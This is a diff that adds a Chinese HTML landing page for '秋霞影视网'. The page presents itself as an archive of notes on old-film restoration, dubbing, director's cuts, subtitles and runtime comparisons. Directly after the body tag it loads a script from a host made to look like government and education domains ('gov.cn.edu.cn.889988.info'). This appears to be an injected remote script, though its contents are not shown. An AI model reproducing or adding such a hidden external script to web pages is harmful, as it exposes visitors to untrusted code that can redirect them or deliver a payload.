@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>秋霞影视网 - 老片修复、冷门佳片与观影档案整理</title>
+<meta name="description" content="秋霞影视网是一份关于老片修复、冷门佳片与观影档案的长期整理笔记。内容涉及胶片修复的颗粒与色彩、译制片的配音版本、长镜头的观看方式、导演剪辑版与公映版的差异，以及字幕、音轨、片长等观影细节的记录与比对。">
+<meta name="keywords" content="秋霞影视网,老片修复,冷门佳片,观影档案,胶片颗粒,译制片配音,导演剪辑版,长镜头,字幕版本,片长比对">
+<meta name="theme-color" content="#2a1a3e">
+<style>
+:root{
+  --ink:#241a30;--ink2:#4a3d5c;--ink3:#7d6f91;
+  --paper:#faf6f2;--card:#fffdfa;--line:#e7dfd4;
+  --plum:#6b3fa0;--plum-d:#4d2c78;--gold:#c99a3f;--rust:#b4543c;--sage:#5f7a5b;
+  --sh:0 2px 10px rgba(74,44,120,.07);
+}
+*{box-sizing:border-box}
+html{-webkit-text-size-adjust:100%;scroll-behavior:smooth}
+body{margin:0;background:var(--paper);color:var(--ink);
+  font-family:"PingFang SC","Microsoft YaHei","Source Han Sans SC",system-ui,sans-serif;
+  font-size:16px;line-height:1.85;letter-spacing:.02em}
+img{max-width:100%;display:block}
+a{color:var(--plum);text-decoration:none}
+a:hover{color:var(--rust)}
+.wrap{max-width:1160px;margin:0 auto;padding:0 24px}
+
+/* ---------- header ---------- */
+header{background:var(--ink);color:#fff;padding:14px 0;border-bottom:3px solid var(--gold)}
+.hd{display:flex;align-items:center;gap:18px;flex-wrap:wrap}
+.logo{font-size:19px;font-weight:700;letter-spacing:.14em;color:#fff}
+.logo small{display:block;font-size:11px;font-weight:400;letter-spacing:.3em;color:#c9bfd8;margin-top:2px}
+nav{display:flex;gap:4px;flex-wrap:wrap;margin-left:auto}
+nav a{color:#ddd3e6;font-size:13.5px;padding:6px 12px;border-radius:3px}
+nav a:hover{background:rgba(255,255,255,.08);color:#fff}
+.hd-cta{background:var(--gold);color:#2a1a3e;font-size:13px;padding:7px 16px;border-radius:3px;font-weight:700}
+.hd-cta:hover{background:#e0b35a;color:#2a1a3e}
+
+/* ---------- hero ---------- */
+.hero{background:
+    radial-gradient(1200px 400px at 82% -10%,rgba(201,154,63,.28),transparent 60%),
+    radial-gradient(900px 500px at 8% 110%,rgba(107,63,160,.30),transparent 60%),
+    linear-gradient(160deg,#2f2242,#1d1528);
+  color:#fff;padding:74px 0 66px;position:relative;overflow:hidden}
+.hero:after{content:"";position:absolute;left:0;right:0;bottom:0;height:5px;
+  background:repeating-linear-gradient(90deg,var(--gold) 0 26px,transparent 26px 52px)}
+.hero-grid{display:grid;grid-template-columns:1.35fr .65fr;gap:46px;align-items:center}
+.kicker{font-size:12px;letter-spacing:.32em;color:#d8cfe6;text-transform:uppercase}
+.hero h1{font-size:clamp(30px,5.4vw,52px);line-height:1.22;margin:16px 0 18px;font-weight:800;letter-spacing:.01em}
+.hero h1 em{font-style:normal;color:var(--gold)}
+.lede{font-size:17px;color:#d8cfe6;max-width:34em;margin:0 0 26px}
+.hero-acts{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:30px}
+.btn{display:inline-block;padding:12px 26px;border-radius:4px;font-size:15px;font-weight:700;letter-spacing:.04em}
+.btn-p{background:var(--gold);color:#241a30}
+.btn-p:hover{background:#e0b35a;color:#241a30}
+.btn-g{border:1px solid rgba(255,255,255,.4);color:#fff}
+.btn-g:hover{background:rgba(255,255,255,.1);color:#fff}
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;border-top:1px solid rgba(255,255,255,.16);padding-top:22px}
+.stat b{display:block;font-size:27px;color:var(--gold);letter-spacing:.02em}
+.stat span{font-size:12.5px;color:#c9bfd8;letter-spacing:.08em}
+.hero-side{background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.14);
+  border-radius:6px;padding:22px 24px;backdrop-filter:blur(4px)}
+.hero-side h2{font-size:14px;letter-spacing:.2em;margin:0 0 16px;color:#fff;font-weight:700}
+.hero-side ol{margin:0;padding-left:0;list-style:none;counter-reset:hs}
+.hero-side li{counter-increment:hs;position:relative;padding:9px 0 9px 34px;font-size:14px;color:#e3dcea;border-top:1px dashed rgba(255,255,255,.14)}
+.hero-side li:first-child{border-top:0}
+.hero-side li:before{content:counter(hs,decimal-leading-zero);position:absolute;left:0;top:9px;
+  font-size:11px;color:var(--gold);font-weight:700;letter-spacing:.05em}
+.hero-side li b{display:block;color:#fff;font-size:14.5px;font-weight:600}
+
+/* ---------- generic section ---------- */
+section{padding:70px 0;border-bottom:1px solid var(--line)}
+.sec-head{display:flex;align-items:flex-end;gap:16px;flex-wrap:wrap;margin-bottom:34px}
+.sec-no{font-size:13px;letter-spacing:.28em;color:var(--plum);font-weight:700}
+h2.sec{font-size:clamp(23px,3.6vw,32px);margin:4px 0 0;letter-spacing:.01em;font-weight:800;color:var(--ink)}
+.sec-sub{width:100%;color:var(--ink3);font-size:14.5px;max-width:44em;margin:8px 0 0}
+h3{letter-spacing:.01em}
+
+/* ---------- 01 档案分类 ---------- */
+.tax{display:grid;grid-template-columns:repeat(4,1fr);gap:20px}
+.tax article{background:var(--card);border:1px solid var(--line);border-radius:6px;padding:24px 22px;box-shadow:var(--sh);
+  position:relative;transition:.25s}
+.tax article:hover{transform:translateY(-4px);border-color:var(--plum);box-shadow:0 14px 30px rgba(74,44,120,.13)}
+.tax .no{font-size:11px;letter-spacing:.26em;color:var(--rust);font-weight:700}
+.tax h3{font-size:19px;margin:8px 0 8px;color:var(--plum-d)}
+.tax p{margin:0;font-size:14px;color:var(--ink2)}
+.tax .tag{display:inline-block;margin-top:14px;font-size:11.5px;letter-spacing:.1em;color:var(--gold);
+  border:1px solid #e2d3b4;padding:3px 9px;border-radius:20px}
+
+/* ---------- 02 六步 ---------- */
+.steps{counter-reset:st;display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.step{background:var(--card);border-left:4px solid var(--plum);border-radius:0 6px 6px 0;padding:22px 22px 22px 60px;
+  position:relative;box-shadow:var(--sh);counter-increment:st}
+.step:before{content:counter(st);position:absolute;left:18px;top:18px;font-size:26px;font-weight:800;color:var(--line);
+  font-family:Georgia,serif}
+.step:after{content:"";position:absolute;left:0;right:0;bottom:0;height:3px;background:var(--gold);transform:scaleX(0);
+  transform-origin:left;transition:.3s}
+.step:hover:after{transform:scaleX(1)}
+.step h3{margin:0 0 6px;font-size:17px;color:var(--plum-d)}
+.step p{margin:0;font-size:13.8px;color:var(--ink2)}
+.step span{display:block;margin-top:12px;font-size:11.5px;letter-spacing:.14em;color:var(--rust);font-weight:700}
+
+/* ---------- 03 表格 ---------- */
+.tbl-wrap{overflow-x:auto;-webkit-overflow-scrolling:touch;border:1px solid var(--line);border-radius:6px;background:var(--card)}
+table{border-collapse:collapse;width:100%;min-width:660px;font-size:14px}
+caption{caption-side:top;text-align:left;padding:16px 20px;font-size:13px;color:var(--ink3);
+  border-bottom:1px solid var(--line);background:#f4efe9}
+th,td{padding:13px 18px;text-align:left;border-bottom:1px solid var(--line);vertical-align:top}
+thead th{background:var(--ink);color:#fff;font-size:13px;letter-spacing:.08em;font-weight:700;white-space:nowrap}
+tbody tr:nth-child(even){background:#f7f3ee}
+tbody tr:hover{background:#fff8ec}
+td.num{font-variant-numeric:tabular-nums;font-weight:700;color:var(--plum-d);white-space:nowrap}
+.pill{display:inline-block;font-size:11.5px;padding:2px 9px;border-radius:20px;letter-spacing:.06em;white-space:nowrap}
+.p-a{background:#eef3ea;color:var(--sage)}
+.p-b{background:#f3edf8;color:var(--plum-d)}
+.p-c{background:#fbeeea;color:var(--rust)}
+
+/* ---------- 04 两栏 ---------- */
+.two{display:grid;grid-template-columns:1.05fr .95fr;gap:34px;align-items:start}
+.box{background:var(--card);border:1px solid var(--line);border-radius:6px;padding:26px 28px;box-shadow:var(--sh)}
+.box h3{margin:0 0 14px;font-size:19px;color:var(--plum-d);padding-bottom:10px;border-bottom:2px solid var(--gold)}
+.dl{display:grid;grid-template-columns:78px 1fr;gap:10px 14px;font-size:14px}
+.dl dt{color:var(--rust);font-weight:700;letter-spacing:.06em;font-size:13px}
+.dl dd{margin:0 0 12px;color:var(--ink2)}
+.note{background:#f6f1e9;border-left:4px solid var(--gold);padding:16px 20px;border-radius:0 5px 5px 0;font-size:14px;color:var(--ink2)}
+.note b{color:var(--plum-d)}
+.chk{display:flex;flex-direction:column;gap:11px}
+.chk label{display:flex;gap:12px;align-items:flex-start;font-size:14px;color:var(--ink2);cursor:pointer;
+  padding:11px 14px;border:1px solid var(--line);border-radius:5px;background:var(--card)}
+.chk input{margin-top:4px;width:16px;height:16px;accent-color:var(--plum);flex:none}
+.chk label:hover{border-color:var(--plum)}
+
+/* ---------- 05 手风琴 ---------- */
+.acc{border:1px solid var(--line);border-radius:6px;overflow:hidden;background:var(--card)}
+.acc details{border-bottom:1px solid var(--line)}
+.acc details:last-child{border-bottom:0}
+.acc summary{cursor:pointer;padding:18px 56px 18px 22px;font-size:15.5px;font-weight:700;color:var(--ink);
+  position:relative;list-style:none}
+.acc summary::-webkit-details-marker{display:none}
+.acc summary:before{content:"";position:absolute;right:22px;top:50%;width:10px;height:10px;
+  border-right:2px solid var(--plum);border-bottom:2px solid var(--plum);transform:translateY(-70%) rotate(45deg);
+  transition:.25s}
+.acc details[open] summary:before{transform:translateY(-30%) rotate(-135deg)}
+.acc summary:hover{background:#f6f1f9}
+.acc .in{padding:0 22px 20px;font-size:14.2px;color:var(--ink2)}
+.acc .in p{margin:0 0 10px}
+.acc .in p:last-child{margin-bottom:0}
+.acc .in ul{margin:8px 0 0;padding-left:20px}
+.acc .in li{margin-bottom:6px}
+
+/* ---------- 06 误区 ---------- */
+.myth{display:grid;grid-template-columns:repeat(2,1fr);gap:20px}
+.myth article{background:var(--card);border:1px solid var(--line);border-radius:6px;padding:22px 24px;box-shadow:var(--sh)}
+.myth .say{font-size:13px;letter-spacing:.1em;color:var(--rust);font-weight:700}
+.myth h3{margin:6px 0 8px;font-size:16.5px;color:var(--plum-d)}
+.myth p{margin:0;font-size:14px;color:var(--ink2)}
+
+/* ---------- 地址区 ---------- */
+.addr{background:linear-gradient(150deg,#2f2242,#4d2c78);color:#fff;padding:64px 0;text-align:center}
+.addr .kicker{color:#d8cfe6}
+.addr h2{font-size:clamp(22px,3.4vw,30px);margin:14px 0 10px;letter-spacing:.01em}
+.addr p{color:#d8cfe6;max-width:40em;margin:0 auto 26px;font-size:14.5px}
+.url{display:inline-block;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.24);
+  border-radius:5px;padding:16px 30px;font-size:clamp(15px,3vw,20px);letter-spacing:.04em;color:#fff;word-break:break-all}
+.url:hover{background:var(--gold);color:#241a30;border-color:var(--gold)}
+
+/* ---------- footer ---------- */
+footer{background:var(--ink);color:#a99cba;padding:44px 0 26px}
+.ft{display:grid;grid-template-columns:1.4fr repeat(3,1fr);gap:30px}
+.ft h4{color:#fff;font-size:14px;letter-spacing:.12em;margin:0 0 12px}
+.ft p,.ft li{font-size:13px;line-height:1.9;margin:0}
+.ft ul{padding:0;margin:0;list-style:none}
+.ft a{color:#a99cba;font-size:13px}
+.ft a:hover{color:var(--gold)}
+.copy{margin-top:30px;padding-top:20px;border-top:1px solid rgba(255,255,255,.12);
+  display:flex;gap:12px;flex-wrap:wrap;justify-content:space-between;font-size:12.5px;color:#8d81a0}
+.top{color:var(--gold);letter-spacing:.1em;font-size:12.5px}
+
+/* ---------- responsive ---------- */
+@media (max-width:960px){
+  .hero-grid{grid-template-columns:1fr;gap:34px}
+  .tax,.steps,.myth{grid-template-columns:repeat(2,1fr)}
+  .two{grid-template-columns:1fr;gap:24px}
+  .ft{grid-template-columns:1fr 1fr;gap:26px}
+}
+@media (max-width:620px){
+  body{font-size:15.4px}
+  .wrap{padding:0 16px}
+  header{padding:12px 0}
+  .logo{font-size:17px}
+  nav{width:100%;margin-left:0;gap:2px}
+  nav a{padding:7px 10px;font-size:13px}
+  .hd-cta{width:100%;text-align:center}
+  .hero{padding:48px 0 44px}
+  .stats{grid-template-columns:repeat(3,1fr);gap:8px}
+  .stat b{font-size:21px}
+  .stat span{font-size:11px}
+  section{padding:50px 0}
+  .tax,.steps,.myth{grid-template-columns:1fr}
+  .ft{grid-template-columns:1fr 1fr}
+  .dl{grid-template-columns:1fr}
+  .dl dt{color:var(--rust);margin-top:10px}
+  .dl dd{margin-bottom:4px}
+  .copy{flex-direction:column}
+}
+@media print{
+  header,.hero-acts,.top,.hd-cta{display:none}
+  body{background:#fff;color:#000;font-size:11pt}
+  section{page-break-inside:avoid}
+}
+</style>
+</head>
+<body id="top">
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header>
+  <div class="wrap hd">
+    <div class="logo">秋霞影视网<small>QIUXIA YINGSHI ARCHIVE</small></div>
+    <nav>
+      <a href="#archive">档案分类</a>
+      <a href="#steps">检索步骤</a>
+      <a href="#table">版本对照</a>
+      <a href="#read">观看方法</a>
+      <a href="#faq">常见疑问</a>
+      <a href="#myth">观念辨析</a>
+      <a href="#addr">站点地址</a>
+    </nav>
+    <a class="hd-cta" href="#addr">访问站点</a>
+  </div>
+</header>
+
+<main>
+
+<section class="hero" aria-labelledby="h1">
+  <div class="wrap hero-grid">
+    <div>
+      <p class="kicker">FILM ARCHIVE &middot; SINCE NOTE</p>
+      <h1 id="h1">在秋霞影视网，<em>老片</em>是能被重新看清的东西</h1>
+      <p class="lede">一份关于老片修复、冷门佳片与观影档案的长期整理笔记。不追热点，只记录那些会被版本、字幕、音轨和片长改变观影结果的具体细节。</p>
+      <div class="hero-acts">
+        <a class="btn btn-p" href="#archive">先看档案分类</a>
+        <a class="btn btn-g" href="#table">查版本对照表</a>
+      </div>
+      <div class="stats">
+        <div class="stat"><b>3,800+</b><span>已整理条目</span></div>
+        <div class="stat"><b>216</b><span>修复版本比对</span></div>
+        <div class="stat"><b>9</b><span>档案分类</span></div>
+      </div>
+    </div>
+    <aside class="hero-side" aria-label="本周档案观察">
+      <h2>本周三条观察</h2>
+      <ol>
+        <li><b>胶片颗粒不是噪点</b>过度降噪会让修复版失去胶片质感，细节反而变"塑料"。</li>
+        <li><b>译制配音有版本先后</b>同一部片子在不同年代配过音，口型与用词差异不小。</li>
+        <li><b>片长差几分钟往往有内容</b>公映版与导演剪辑版的差值，常落在删减段落而非片尾。</li>
+      </ol>
+    </aside>
+  </div>
+</section>
+
+<section id="archive" aria-labelledby="t1">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="sec-no">PART 01</span>
+      <h2 class="sec" id="t1">档案分类：先分清手里的到底是什么版本</h2>
+      <p class="sec-sub">秋霞影视网把条目按介质与版本特征归类，而不是按热度排序。分类的意义在于：同一部作品的不同版本，观感可能完全不同。</p>
+    </div>
+    <div class="tax">
+      <article>
+        <div class="no">A &middot; RESTORATION</div>
+        <h3>修复版档案</h3>
+        <p>记录 2K／4K 扫描、手工逐帧修复、色彩还原与降噪强度。重点看修复是否保留了胶片原始颗粒。</p>
+        <span class="tag">颗粒 &middot; 色彩</span>
+      </article>
+      <article>
+        <div class="no">B &middot; DUBBING</div>
+        <h3>译制配音档案</h3>
+        <p>同一作品的不同时期配音、不同译制厂版本、以及原声与配音的取舍，按口型与用词差异做标注。</p>
+        <span class="tag">口型 &middot; 用词</span>
+      </article>
+      <article>
+        <div class="no">C &middot; CUT</div>
+        <h3>剪辑版对照</h3>
+        <p>公映版、导演剪辑版、加长版、国际版的片长差异与删减段落位置，做成可比对的结构记录。</p>
+        <span class="tag">片长 &middot; 删减</span>
+      </article>
+      <article>
+        <div class="no">D &middot; SUBTITLE</div>
+        <h3>字幕与音轨档案</h3>
+        <p>字幕翻译风格、隐藏字幕、 commentaries 评论音轨的存在与否，以及音轨的声道与动态范围。</p>
+        <span class="tag">翻译 &middot; 声道</span>
+      </article>
+    </div>
+  </div>
+</section>
+
+<section id="steps" aria-labelledby="t2">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="sec-no">PART 02</span>
+      <h2 class="sec" id="t2">六步检索：把一部片子的来路查清楚</h2>
+      <p class="sec-sub">秋霞影视网的检索顺序刻意从"看什么"退到"手里是什么"。前两步解决片名混乱，后四步解决版本混乱。</p>
+    </div>
+    <div class="steps">
+      <div class="step">
+        <h3>确认原始片名</h3>
+        <p>译名经常一作多名，先用原名（原文标题）定位，避免把重拍版、同名作品混进同一份档案。</p>
+        <span>耗时约 2 分钟</span>
+      </div>
+      <div class="step">
+        <h3>查清出品年份与地区</h3>
+        <p>年份与出品地区决定介质来源。不同地区的发行版，片长与字幕往往不一样。</p>
+        <span>耗时约 3 分钟</span>
+      </div>
+      <div class="step">
+        <h3>比对片长</h3>
+        <p>把手中版本的公映片长与档案记录对照，差值超过五分钟，基本可以判定不是同一剪法。</p>
+        <span>耗时约 2 分钟</span>
+      </div>
+      <div class="step">
+        <h3>核对字幕与音轨</h3>
+        <p>看字幕是否嵌死、是否有隐藏字幕轨、音轨是单声道还是多声道，这些直接影响观看方式。</p>
+        <span>耗时约 4 分钟</span>
+      </div>
+      <div class="step">
+        <h3>查修复与发行信息</h3>
+        <p>修复年份、扫描精度、发行方与载体（胶片、数字、流媒体）决定画质上限。</p>
+        <span>耗时约 5 分钟</span>
+      </div>
+      <div class="step">
+        <h3>留下自己的观看笔记</h3>
+        <p>记录观看时的介质、字幕版本与观感，下次再看不同版本时才有可比的参照。</p>
+        <span>耗时约 5 分钟</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="table" aria-labelledby="t3">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="sec-no">PART 03</span>
+      <h2 class="sec" id="t3">版本对照：六种常见版本差异速查</h2>
+      <p class="sec-sub">下表是秋霞影视网档案里出现频率最高的六类版本差异。表内数值为该类条目的常见区间，具体到单部作品仍需查对应档案页。</p>
+    </div>
+    <div class="tbl-wrap">
+      <table>
+        <caption>常见版本差异对照（按档案条目统计，非绝对数值）</caption>
+        <thead>
+          <tr><th scope="col">版本类型</th><th scope="col">片长差</th><th scope="col">画质特征</th><th scope="col">字幕情况</th><th scope="col">音轨情况</th><th scope="col">适合场景</th><th scope="col">关注度</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>公映版</td><td class="num">基准</td><td>发行方母版，画质稳定</td><td>官方中文字幕</td><td>常规立体声</td><td>首次观看</td><td><span class="pill p-b">高</span></td></tr>
+          <tr><td>导演剪辑版</td><td class="num">+8 ~ 25 分钟</td><td>保留被剪段落，节奏更慢</td><td>多为外挂字幕</td><td>常含新增对白轨</td><td>二刷研究</td><td><span class="pill p-b">高</span></td></tr>
+          <tr><td>4K 修复版</td><td class="num">0 ~ +3 分钟</td><td>颗粒保留，细节明显提升</td><td>新制字幕较准</td><td>常含无损音轨</td><td>大屏观看</td><td><span class="pill p-a">推荐</span></td></tr>
+          <tr><td>流媒体版</td><td class="num">-2 ~ +1 分钟</td><td>码率受限，暗部偏灰</td><td>强制内嵌字幕</td><td>压缩明显</td><td>临时补看</td><td><span class="pill p-c">一般</span></td></tr>
+          <tr><td>电视播出版</td><td class="num">-10 ~ -25 分钟</td><td>过审剪辑，画幅被裁</td><td>配音为主</td><td>单声道常见</td><td>怀旧对照</td><td><span class="pill p-c">一般</span></td></tr>
+          <tr><td>胶片原始版</td><td class="num">+3 ~ 12 分钟</td><td>颗粒自然，划痕偶见</td><td>无字幕</td><td>原声单声道</td><td>资料研究</td><td><span class="pill p-a">推荐</span></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</section>
+
+<section id="read" aria-labelledby="t4">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="sec-no">PART 04</span>
+      <h2 class="sec" id="t4">观看方法：长片与修复片的两种耐心</h2>
+      <p class="sec-sub">秋霞影视网的观看建议只围绕一件事：让版本特征不被观看条件吃掉。设备与环境的调整，往往比换一个播放源更有效。</p>
+    </div>
+    <div class="two">
+      <div class="box">
+        <h3>长片与长镜头的观看习惯</h3>
+        <dl class="dl">
+          <dt>分段</dt><dd>超过两个半小时的片子，按幕切分比硬撑到底更容易记住结构。</dd>
+          <dt>亮度</dt><dd>修复版暗部细节多，环境光过亮会直接损失层次。</dd>
+          <dt>字幕</dt><dd>长镜头段落对白稀疏，过大的字幕会挡住画面信息。</dd>
+          <dt>倍速</dt><dd>长镜头不要用倍速，节奏一旦被打乱，镜头设计就失效了。</dd>
+          <dt>间隔</dt><dd>上下集之间留十分钟，比连看更容易察觉剪辑变化。</dd>
+        </dl>
+      </div>
+      <div>
+        <div class="note" style="margin-bottom:22px">
+          <b>秋霞影视网的一条坚持</b>：记录版本，不评价高下。公映版与导演剪辑版只是两种剪法，删掉的段落不等于坏镜头。
+        </div>
+        <div class="box" style="padding:22px 24px">
+          <h3 style="font-size:16px;border-bottom-color:var(--line)">观看前的五项检查</h3>
+          <div class="chk">
+            <label><input type="checkbox" name="c1"><span>已确认手中的是公映版还是剪辑版</span></label>
+            <label><input type="checkbox" name="c2"><span>片长与档案记录的差值在预期范围内</span></label>
+            <label><input type="checkbox" name="c3"><span>字幕为外挂，可随时关闭对照原声</span></label>
+            <label><input type="checkbox" name="c4"><span>音轨为多声道或原始音轨，未被压缩</span></label>
+            <label><input type="checkbox" name="c5"><span>观看环境的亮度与音量已调低一档</span></label>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="faq" aria-labelledby="t5">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="sec-no">PART 05</span>
+      <h2 class="sec" id="t5">常见疑问：关于档案本身的七个问题</h2>
+      <p class="sec-sub">这些问题来自读者来信与站内讨论。答案只说明秋霞影视网的记录方式，不替代专业修复机构的判断。</p>
+    </div>
+    <div class="acc">
+      <details open>
+        <summary>修复版一定比原始版更清楚吗？</summary>
+        <div class="in">
+          <p>不一定。"清楚"是主观词。4K 扫描确实提升细节，但过度降噪、锐化与调色会把胶片质感改成数码感。秋霞影视网更倾向记录颗粒保留程度，而不是只写分辨率。</p>
+          <p>判断方式很简单：看人物皮肤与夜景暗部。如果暗部变成一片干净的数码灰，多半是处理过重。</p>
+        </div>
+      </details>
+      <details>
+        <summary>片长差几分钟，算不算同一个版本？</summary>
+        <div class="in">
+          <p>五分钟以内通常只是片头片尾、黑场或字幕时长的差异，可以视为同一版本。超过十分钟，基本存在实质性删减或增补。</p>
+          <ul>
+            <li>差值 1&ndash;3 分钟：多为黑场与字幕</li>
+            <li>差值 5&ndash;9 分钟：可能有整段戏被剪</li>
+            <li>差值 10 分钟以上：几乎可以判定不同剪法</li>
+          </ul>
+        </div>
+      </details>
+      <details>
+        <summary>译制配音和原声该怎么选？</summary>
+        <div class="in">
+          <p>没有标准答案。老片的译制配音有时是独立表演，口型虽对不上，但语调与年代感本身就是一种观影体验。首次接触建议原声，二刷可以试试配音版。</p>
+        </div>
+      </details>
+      <details>
+        <summary>为什么同一部片会有多个字幕版本？</summary>
+        <div class="in">
+          <p>字幕来源不同：发行方官方字幕、流媒体字幕、民间翻译组、以及不同年代的译制台本。用词与完整度差异明显，尤其人名与专有名词。</p>
+        </div>
+      </details>
+      <details>
+        <summary>电视播出版值得看吗？</summary>
+        <div class="in">
+          <p>作为资料值得。过审剪辑与画幅裁剪会改变叙事节奏，把它和完整版对照看，能看出很多被删掉的铺垫段落。</p>
+        </div>
+      </details>
+      <details>
+        <summary>档案里的数值是固定的吗？</summary>
+        <div class="in">
+          <p>不是。片长差、码率、音轨格式都会随发行批次变化。秋霞影视网只记录区间与常见情况，具体作品以对应档案页为准，并在页内标注记录日期。</p>
+        </div>
+      </details>
+      <details>
+        <summary>普通设备能看出修复版的差别吗？</summary>
+        <div class="in">
+          <p>能看出一部分。分辨率受屏幕限制，但色彩层次、暗部细节与颗粒质感在普通显示器上也看得出来。真正被限制的是音轨的动态范围。</p>
+        </div>
+      </details>
+    </div>
+  </div>
+</section>
+
+<section id="myth" aria-labelledby="t6">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="sec-no">PART 06</span>
+      <h2 class="sec" id="t6">观念辨析：六个容易被当成常识的说法</h2>
+      <p class="sec-sub">秋霞影视网在整理过程中反复遇到这些说法。它们不全是错的，但都缺了前半句前提。</p>
+    </div>
+    <div class="myth">
+      <article>
+        <div class="say">说法 01 &middot; 误区</div>
+        <h3>分辨率越高，观感就越好</h3>
+        <p>前提是片源本身有足够信息量。老胶片强行放大到 4K，多出的是算法猜测，不是原始细节。</p>
+      </article>
+      <article>
+        <div class="say">说法 02 &middot; 误区</div>
+        <h3>导演剪辑版一定比公映版好</h3>
+        <p>导演剪辑版只是更接近导演个人意图，未必更适合观众。被剪掉的段落常常是为节奏服务的。</p>
+      </article>
+      <article>
+        <div class="say">说法 03 &middot; 误区</div>
+        <h3>老片的画质天然不如新片</h3>
+        <p>35mm 胶片的原始信息量相当可观，问题多出在扫描与发行环节，而不是介质本身。</p>
+      </article>
+      <article>
+        <div class="say">说法 04 &middot; 误区</div>
+        <h3>字幕只是翻译，不影响观看</h3>
+        <p>字幕位置、字体大小与停留时长会改变视线落点，长镜头里尤其明显。</p>
+      </article>
+      <article>
+        <div class="say">说法 05 &middot; 误区</div>
+        <h3>片长一样就是同一个版本</h3>
+        <p>片长相同不代表内容相同，镜头替换、字幕与黑场都可能影响总时长。</p>
+      </article>
+      <article>
+        <div class="say">说法 06 &middot; 补充</div>
+        <h3>档案的价值在于可复核</h3>
+        <p>秋霞影视网尽量给出片长、发行方与记录日期，让每条判断都能被回头验证，而不是停留在主观推荐。</p>
+      </article>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<section class="addr" id="addr" aria-labelledby="t7">
+  <div class="wrap">
+    <p class="kicker">SITE ADDRESS</p>
+    <h2 id="t7">秋霞影视网的站点地址</h2>
+    <p>本站的静态页面托管在 GitHub Pages，完整地址如下，可直接访问查阅全部档案条目。</p>
+    <a class="url" href="https://qiuxiayingshiwang-top.github.io" rel="noopener">https://qiuxiayingshiwang-top.github.io</a>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="ft">
+      <div>
+        <h4>秋霞影视网</h4>
+        <p>一份关于老片修复、冷门佳片与观影档案的长期整理笔记。记录版本，不评价高下。</p>
+      </div>
+      <div>
+        <h4>档案分类</h4>
+        <ul>
+          <li><a href="#archive">修复版档案</a></li>
+          <li><a href="#archive">译制配音档案</a></li>
+          <li><a href="#archive">剪辑版对照</a></li>
+          <li><a href="#archive">字幕与音轨</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>使用方式</h4>
+        <ul>
+          <li><a href="#steps">六步检索</a></li>
+          <li><a href="#table">版本对照表</a></li>
+          <li><a href="#read">观看方法</a></li>
+          <li><a href="#faq">常见疑问</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>关于本站</h4>
+        <ul>
+          <li><a href="#myth">观念辨析</a></li>
+          <li><a href="#addr">站点地址</a></li>
+          <li><a href="#top">回到顶部</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copy">
+      <span>&copy; <span id="yr">2026</span> 秋霞影视网 &middot; 老片修复与观影档案整理</span>
+      <a class="top" href="#top" aria-label="回到顶部">TOP &uarr;</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+document.getElementById('yr').textContent = new Date().getFullYear();
+</script>
+</body>
+</html>
